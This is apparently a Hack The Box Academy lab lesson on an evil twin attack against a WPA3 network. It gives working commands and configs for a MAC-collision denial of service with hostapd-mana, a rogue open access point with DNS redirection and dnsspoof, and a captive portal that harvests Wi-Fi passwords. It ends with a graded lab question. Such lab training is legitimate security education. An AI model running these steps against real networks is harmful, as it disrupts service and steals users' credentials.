
<h1>Evil Twin Attack on WPA3</h1>
<hr/>
<p>Performing an evil twin attack on a WPA3 network is similar to attacking a WPA2 network, but it comes with additional challenges due to the enhanced security features of WPA3. In WPA2 networks, an attacker typically creates an open network with the same BSSID as the target network and uses tools like <code>aireplay-ng</code> to deauthenticate connected clients. This forces the clients to reconnect, resulting in them connecting to the attacker’s rogue access point.</p>
<p><img alt="intro" src="https://academy.hackthebox.com/storage/modules/291/intro/002.png"/></p>
<p>In WPA3 networks, traditional deauthentication attacks are ineffective due to the implementation of 802.11w (Protected Management Frames, PMF). <a href="https://wlan1nde.wordpress.com/2014/10/21/protected-management-frames-802-11w/">PMF</a> authenticates management frames like <code>deauthentication packets</code>, making such attacks useless. To bypass this protection, attackers can create a denial-of-service (DoS) condition to disrupt connections to the legitimate access point. This can be achieved through techniques like <code>MAC collisions</code> and the <code>Loud MANA</code> attack, where a rogue access point mimics the target network's BSSID and ESSID.</p>
<p>Although the attacker does not have the correct password for the target AP, it still disrupts legitimate connections, potentially confusing clients. The attacker would set up two rogue access points, one with <code>WPA2</code> authentication mirroring the legitimate AP to create collision events and another with <code>open</code> rogue AP to encourage manual client connections. This approach is particularly effective on clients attempting to reconnect to the network.</p>
<p><img alt="wpa3" src="https://academy.hackthebox.com/storage/modules/291/wpa3/wpa3.png"/></p>
<hr/>
<h3>Enumeration</h3>
<p>To perform the Evil Twin attack, we will need three WLAN interfaces:</p>
<ul>
<li>
<code>wlan0</code> : Set to monitor mode to scan the target network and identify clients and access points.</li>
<li>
<code>wlan1</code> : Configured in master mode to host a fake access point (AP) with the same BSSID as the target, creating a collision event.</li>
<li>
<code>wlan2</code> : Also configured in master mode to host an open-network access point, where clients will connect after being deauthenticated from the target network.</li>
</ul>
<pre><code class="language-shell-session">[!bash!]$ iwconfig

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
wlan2     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
          
wlan3     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
</code></pre>
<p>We begin by enabling monitor mode on our <code>wlan0</code> interface using <code>airmon-ng</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    184 avahi-daemon
    204 wpa_supplicant
    208 avahi-daemon
    231 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
phy3	wlan1		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy4	wlan2		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
phy5	wlan3		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211
</code></pre>
<p>Once our interface is in monitor mode, we can use <code>airodump-ng</code> to scan for available Wi-Fi networks and their associated clients.</p>
<pre><code class="language-shell-session"> CH  1 ][ Elapsed: 6 s ][ 2024-12-20 10:32 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 9C:9A:03:39:BD:7A  -47        7        2    0   1   54   WPA3 CCMP   SAE  HTB-Corp                    

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 9C:9A:03:39:BD:7A  62:BD:99:A1:9E:1B  -29    0 - 1      6        2 
</code></pre>
<p>From the output above, we can observe that the <code>HTB-Corp</code> Wi-Fi network is active with the BSSID <code>9C:9A:03:39:BD:7A</code> and has a client connected with the MAC address <code>62:BD:99:A1:9E:1B</code>. Next, we'll proceed with the Evil Twin attack to attempt luring the client into connecting to our open-network access point, aiming to capture their clear-text credentials.</p>
<hr/>
<h2>Performing the Attack</h2>
<p>Since Wi-Fi operates over the wireless medium at the Physical Layer, it depends on MAC addresses from the Data-Link Layer for communication. By spinning up a rogue AP with the same MAC address (BSSID) as the legitimate access point (AP), we can intentionally create collision events. If the rogue AP's signal strength is stronger than the legitimate AP's, client devices will be unable to connect to the legitimate network, effectively denying service. This forms the foundation of our Evil-Twin Attack strategy.</p>
<hr/>
<h4>General steps for WPA3 Evil-Twin Attack</h4>
<ol>
<li>
<code>Deny Service to the Legitimate AP</code>: Configure the rogue access point’s BSSID to match the target AP’s BSSID and set the same SSID (network name). Enable the MANA loud option to retransmit beacon frames aggressively, amplifying the effect. Use MANA attack to disrupt client connections to the legitimate access point, forcing them to seek alternative networks.</li>
<li>
<code>Deploy an Open-Network</code> AP: Set up a rogue access point configured as an open network to entice disconnected clients into connecting. This access point should mimic the legitimate AP’s SSID and channel for authenticity</li>
<li>
<code>Harvest and Validate Credentials</code>: Once clients connect to the rogue access point, capture their authentication attempts. Extract and validate credentials to determine their validity and potential use.</li>
</ol>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> The captive portal is already pre-configured within the lab environment, allowing direct focus on executing the attack and analyzing the results without needing to set up and configure the entire infrastructure manually.
</div>
<br/>
<h3>1. Deny Service to the Legitimate AP</h3>
<p>With IEEE 802.11w, we know that beacon frames remain unprotected. This allows us to leverage a <code>MANA</code> attack to increase the effectiveness of client enticement and enforcement. The <code>mana_loud</code> option would ensure that all beacon frames are retransmitted to clients, amplifying the attack’s impact.</p>
<p>The key to this attack is setting the channel and BSSID of our rogue access point to match the target access point. The PSK does not play a significant role as long as it is configured for WPA2, allowing us to disrupt and lure clients effectively.</p>
<p>To get started, we need to create a <code>mac.conf</code> file with following contents.</p>
<pre><code class="language-configuration">ssid=HTB-Corp
interface=wlan1
channel=1
hw_mode=g

# Mana Attack Configuration
enable_mana=1
mana_loud=1

# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker
</code></pre>
<p>In this file, we specify many parameters. These parameters can be broken down like the following:</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SSID</code></td>
<td>This needs to be the same as the SSID of the target network</td>
</tr>
<tr>
<td><code>Interface</code></td>
<td>The interface which we will be hosting the access point on.</td>
</tr>
<tr>
<td><code>Channel</code></td>
<td>Configures the access point to operate on selected Wi-Fi channel</td>
</tr>
<tr>
<td><code>hw_mode</code></td>
<td>The hw_mode parameter in the hostapd configuration file specifies the hardware mode (frequency band) that the access point should operate in.</td>
</tr>
<tr>
<td><code>enable_mana</code></td>
<td>Enables MANA mode, which is the KARMA beacon attack. This will help stations know that our access point exists, making transitions easier and our attack less intrusive.</td>
</tr>
<tr>
<td><code>Mana_loud</code></td>
<td>This option sets whether or not all beacons will be retransmitted to clients. If we are attempting to be stealthy, we could set this to zero.</td>
</tr>
<tr>
<td><code>wpa=2</code></td>
<td>Enables WPA2 security for the access point.</td>
</tr>
<tr>
<td><code>wpa_key_mgmt</code></td>
<td>Configures WPA2 with Pre-Shared Key (PSK) authentication.</td>
</tr>
<tr>
<td><code>rsn_pairwise</code></td>
<td>Specifies CCMP (AES) as the encryption method for WPA2.</td>
</tr>
<tr>
<td><code>wpa_passphrase</code></td>
<td>Sets the WPA2 PSK passphrase to "PSKmismatchmaker".</td>
</tr>
</tbody>
</table>
<p>Next, we use macchanger to modify the MAC address of the wlan1 interface, ensuring it matches the target AP's BSSID. This step is crucial for creating the MAC collision necessary to disrupt the legitimate AP's functionality.</p>
<pre><code class="language-shell-session">[!bash!]$ ifconfig wlan1 down
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ macchanger -m 9C:9A:03:39:BD:7A wlan1

Current MAC:   66:e9:37:38:1c:49 (unknown)
Permanent MAC: 66:e9:37:38:1c:49 (unknown)
New MAC:       9c:9a:03:39:bd:7a (unknown)
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ ifconfig wlan1 up
</code></pre>
<p>Now, to start the fake access point, we will use <a href="https://github.com/sensepost/hostapd-mana">hostapd-mana</a> which is an excellent tool for this purpose, as it supports <code>KARMA/MANA</code> attacks, negotiable EAP methods, and other valuable features. We use the command <code>hostapd-mana mac.conf</code> to start our fake access point. This rogue AP will generate collision events, effectively blocking legitimate clients from accessing the target access point.</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd-mana mac.conf
Configuration file: mac.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 9C:9A:03:39:BD:7A and ssid "HTB-Corp"
random: Only 19/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED-&gt;ENABLED
wlan1: AP-ENABLED 
Unsupported authentication algorithm (3)
handle_auth_cb: STA 62:bd:99:a1:9e:1b not found
MANA - Directed probe request for SSID 'HTB-Corp' from 62:bd:99:a1:9e:1b
MANA - Directed probe request for SSID 'HTB-Corp' from 62:bd:99:a1:9e:1b
</code></pre>
<h3>2. Deploy an Open-Network AP</h3>
<p>Next, we set up a rogue access point configured as an open network to attract disconnected clients. This rogue AP will mimic the legitimate AP's SSID and  channel to appear authentic. To begin, we create an <code>open.conf</code> file with the following contents:</p>
<pre><code class="language-configuration">interface=wlan2
hw_mode=g
ssid=HTB-Corp
channel=1
driver=nl80211
</code></pre>
<p>This configuration ensures that the rogue AP is broadcasting the same SSID on the same channel as an open network.</p>
<p>Next, we create a configuration file for the DNS server to manage IP assignments and DNS resolution for clients connecting to the rogue access point. For this, we create an <code>dns.conf</code> file with the following contents:</p>
<pre><code class="language-configuration">interface=wlan2
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
</code></pre>
<p>In the above config file, the <code>dhcp-range</code> defines the range of IPs to be assigned to clients, <code>dhcp-option</code> sets the default gateway (option 3) and DNS server (option 6), <code>server</code> points to the DNS servers (Google DNS in this case) and <code>address</code> forces all domain queries to redirect to the rogue IP address (192.168.0.1). This configuration will ensure clients that connect to the rogue AP are given IPs in the defined range and are redirected to the attacker's DNS server.</p>
<p>To start the DNS server with our configuration, we first stop any running dnsmasq service to avoid conflicts by using the command shown below:</p>
<pre><code class="language-shell-session">[!bash!]$ service dnsmasq stop
</code></pre>
<p>Next, we execute the DNS configuration file and start the DNS server on port 53 using:</p>
<pre><code class="language-shell-session">[!bash!]$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 1.1.1.1#53
dnsmasq: read /etc/hosts - 7 names
</code></pre>
<p>This will initiate the rogue DNS server, ensuring that client devices connecting to the fake AP will receive their IP addresses and DNS settings from our attacker-controlled network.</p>
<p>The next step is to configure the valid IP address for the interface that will host the fake access point (<code>wlan1</code>).</p>
<pre><code class="language-shell-session">[!bash!]$ sudo ifconfig wlan2 192.168.0.1/24
[!bash!]$ ifconfig wlan2
wlan2: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 192.168.0.1  netmask 255.255.255.0  broadcast 192.168.0.255
        ether 02:00:00:00:03:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>Additionally, we need to ensure that IP forwarding is enabled on the machine to allow proper routing of traffic between the fake access point and the internet.</p>
<pre><code class="language-shell-session">[!bash!]$ echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</code></pre>
<p>Next, we start dnsspoof on the <code>wlan2</code> interface to redirect all traffic from the victim's device to our attacker's IP address. This step allows us to intercept and monitor the client's communications.</p>
<pre><code class="language-shell-session">[!bash!]$ dnsspoof -i wlan2

dnsspoof: listening on wlan2 [udp dst port 53 and not src 192.168.0.1]
</code></pre>
<p>Finally, we execute hostapd with the open.conf file to start the rogue open network. This will broadcast the fake access point, enticing disconnected clients to connect. Use the following command:</p>
<pre><code class="language-shell-session">[!bash!]$ hostapd open.conf

rfkill: Cannot open RFKILL control device
wlan2: interface state UNINITIALIZED-&gt;ENABLED
wlan2: AP-ENABLED 
wlan2: STA 62:bd:99:a1:9e:1b IEEE 802.11: authenticated
wlan2: STA 62:bd:99:a1:9e:1b IEEE 802.11: associated (aid 1)
wlan2: AP-STA-CONNECTED 62:bd:99:a1:9e:1b
wlan2: STA 62:bd:99:a1:9e:1b RADIUS: starting accounting session 31FF3C4EF15F915F
</code></pre>
<h3>3. Harvest and Validate Credentials</h3>
<p>Once the client connects to our rogue open access point, they will be presented with a captive portal designed to mimic the legitimate login page. This setup enables us to harvest the client's credentials when they attempt to authenticate. The captive portal intercepts their login attempt, allowing us to capture the password in clear text for further use.</p>
<p><img alt="wpa3" src="https://academy.hackthebox.com/storage/modules/291/captive_wpa3.PNG"/></p>
<p>If a user enters their password a POST request is sent to <code>received.php</code>. The <code>received.php</code> file simply takes the user input and writes it to <code>passes.lst</code>, our dictionary. We will be using this dictionary later in order to validate the captured pre-shared keys against the handshake with CowPatty. When testing this form, if an error message is displayed by received.php, it is commonly a permissions issue, which can be resolved with the following command.</p>
<pre><code class="language-shell-session">[!bash!]$ cat /var/www/html/passes.lst 

&lt;SNIP&gt;
</code></pre>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="34" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="48" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                RDP
                                to <span class="target-protocol-ip target-protocol-ip-2837 text-dark"></span> with user "<span class="text-success">wifi</span>" and
                                password "<span class="text-danger">wifi</span>" </p>
<label class="module-question" for="2837"><span class="badge badge-soft-dark font-size-14 mr-2">+ 5 <i class="fad fa-cube text-success"></i></span> Perform the evil twin attack as demonstrated in this section. What is the password obtained?
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2837" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2837">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2837" id="btnAnswer2837">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
